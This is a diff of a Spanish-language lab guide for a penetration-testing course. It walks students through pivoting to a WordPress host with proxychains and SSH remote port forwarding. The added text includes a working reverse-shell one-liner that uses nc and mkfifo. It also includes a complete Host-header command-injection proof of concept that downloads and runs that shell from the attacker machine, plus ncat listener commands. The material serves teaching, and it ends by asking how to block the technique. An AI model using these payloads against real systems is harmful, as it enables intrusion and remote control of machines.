@@ -252,7 +252,7 @@ En esta fase lo primero que vamos a hacer es escanear los puertos del host **hel
 
     Puede ayudarte de *hydra* y del diccionario *rockyou* ubicado el el home.
 
-Una vez obtenido el acceso al cotenedor **helper** y haciendo uso del comando `ip a`, descubriremos que estamos conectados a dos redes diferentes, ya que tenemos dos interfaces, cada una conectada una de esas redes (`172.16.100.11` y `172.16.101.11`)
+Una vez obtenido el acceso al contenedor **helper** y haciendo uso del comando `ip a`, descubriremos que estamos conectados a dos redes diferentes, ya que tenemos dos interfaces, cada una conectada una de esas redes (`172.16.100.11` y `172.16.101.11`)
 
 También es posible utilizar el comando `hostname -I` para ver todas las IP del host.
 
@@ -342,22 +342,117 @@ Para explotar esta vulnerabilidad, podéis seguir los siguientes pasos:
     + El path o ruta será *static/css*
     + Una profundidad o número de directorios de los que se hará *traversal*, será de 3
 
-```
-raul@deaw:~/borrar/sar2html-4.0.0/sar2html$ cat requirements.txt 
-───────┬────────────────────────────────────────────────────────────────────────
-       │ File: requirements.txt
-───────┼────────────────────────────────────────────────────────────────────────
-   1   │ uwsgi
-   2   │ db-sqlite3
-   3   │ Flask
-   4   │ Flask-Threads
-   5   │ altair
-   6   │ altair_data_server
-   7   │ pandas
-   8   │ vega_datasets
-   9   │ markdown
-  10 + │ Werkzeug==2.3.7
+4. En el apartado *New host* subir el archivo **.tar** generado
+5. Acceder a la ruta del archivo
 
-```
+!!!task "Tarea"
+    Comprueba y documenta que accediendo a la ruta del archivo podemos comprobar que esta máquina ha sido comprometida, tanto desde el navegador como desde el terminal (de la máquina *attacker*) con el comando *curl*, haciendo uso dde *proxychains*
+
+
+## Victim2
+
+Para comenzar con esta nueva máquina, debemos realizar <u>de nuevo</u> un escaneo con *nmap* idéntico al anterior, a través de *proxychains* desde la máquina **attacker** a la máquina **victim2** y al **MySQL**.
+
+!!!task "Tarea"
+    Documenta los escaneos anteriores. ¿Qué CMS has descubierto que se está ejecutando?
+
+Para vulnerar la máquina **victim2**, vamos a hacer uso de dos elementos:
+
+1. Este código para una reverse shell
+  
+    ```bash title="rev.sh"
+    #!/bin/bash
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 8500 >/tmp/f    
+    ```
+
+2. Este código como POC (*proof of concept* o prueba de concepto)
+
+    ```bash title="poc.sh"
+    #!/bin/bash
+
+    function prep_host_header() {
+          cmd="$1"
+          rce_cmd="\${run{$cmd}}";
+          rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"
+          rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"
+          host_header="target(any -froot@localhost -be $rce_cmd null)"
+          return 0
+    }
+
+    if [ "$#" -ne 1 ]; then
+    echo -e "Uso:\n$0 url-objetivo\n"
+    exit 1
+    fi
+    target="$1"
+    http_server="172.16.101.11/rev.sh"
+
+    # Guardamos el payload de la reverse shell en el objetivo, en el directorio /tmp/rev.sh
+    cmd="/usr/bin/curl $http_server -o /tmp/rev.sh"
+    prep_host_header "$cmd"
+    curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
+    echo -e "\n\e[92m[+]\e[0m Payload enviado"
+
+    # Obtenemos la reverse shell
+    cmd="/bin/chmod +x /tmp/rev.sh"
+    prep_host_header "$cmd"
+    curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
+    echo -e "\n\e[92m[+]\e[0m Payload enviado"
+
+    cmd="/bin/sh /tmp/rev.sh"
+    prep_host_header "$cmd"
+    curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
+    echo -e "\n\e[92m[+]\e[0m Payload enviado"
+    ```
+Antes de llevar a cabo la explotación, vamos a comprobar que existe conectividad entre **vitim2** y **attacker**. Utilizando *netcat* (nc en **victim2** y ncat **attacker**), intenta establecer una conexión de una a otra.
+
+!!!question "Cuestión"
+    ¿Consigues establecer esta conexión?¿Por qué?
+
+Si repasamos el código de `poc.sh` vemos que el teórico curso de los acontecimientos ha de ser:
+
+1. Ejecutar un servidor web en el terminal de **attacker** para que el comando que se inyecte en la víctima haga que se descargue nuestra reverse shell `rev.sh` en su directorio `/tmp`: 
+  ```python
+  $ python3 -m http.server 80
+  ```
+2. Poner a la escucha `ncat` en **attacker** en un puerto de vuestra elección
+3. Ejecutar desde **attacker**, obviamente haciendo uso de <u>proxychains</u>, `poc.sh` contra la máquina **victim2**
+
+!!!task "Tarea"
+    Ejecuta los pasos anteriores y comprueba si recibes correctamente la reverse shell.
+
+### Reverse shell
+
+Aquí necesitamos utilizar el concepto de de **remote port forwarding**. Con esta técnica crearemos un nuevo túnel que nos permitirá redirigir todo el tráfico que vaya destinado al puerto 80 de la máquina **victim2** hacia el puerto 80 de nuestra máquina **attacker**. Con esto conseguiremos que cuando ejecutemos `poc.sh`, se consiga la comunicación con el servidor web de python que se está ejecutando en **attacker**
+
+!!!task "Tarea"
+    Consulta [este](https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/) link o cualquier otro que te sea necesario para entender el concepto de remote port forwarding y ser capaz de completar el siguiente comando, que deberá ser ejecutado en **attacker**:
+    
+      ```bash
+      ssh ___ :___:172.16.100.10:___ root@helper -N -f
+      ```
+
+!!!task "Tarea"
+    Vuelve a realizar los pasos que hemos visto antes para ejecutar `poc.sh` y comprueba si hay algún cambio respecto a la situación anterior e indicua cuál y por qué.
+
+Ahora sólo estamos a un pequeñísimo paso de conseguir nuestra shell inversa. Necesitamos una nueva redirección de puertos y lo tendremos todo listo.
+
+!!!task "Tarea"
+    Documenta los pasos a seguir con la nueva redirección de puertos y el éxito comprometiendo esta nueva máquina. Elabora un diagrama en [https://app.diagrams.net/](https://app.diagrams.net/) donde se vea el proceso:
+
+      1. `ssh __ :__:172.16.100.10:__ -R :__:172.16.100.10:__ root@helper -N -f`
+      2. `python3 -m http.server 80`
+      4. `ncat -lvnp 1331`
+      3. `proxychains4 -q ./poc.sh 172.16.101.21`
+
+#  Cuestión
+
+!!!question "Cuestión"
+    ¿Cómo podemos evitar el uso de esta técnica de ataque con la redirección de puertos en SSH?
+
+    **Pista:** *Gateway ports*
+
+    Comprueba y documenta que con esta defensa, la técnica anteriormente empleada ya no funciona.
 
 # Referencias 
+
+[SSH Tunneling: Local & Remote Port Forwarding](https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/)
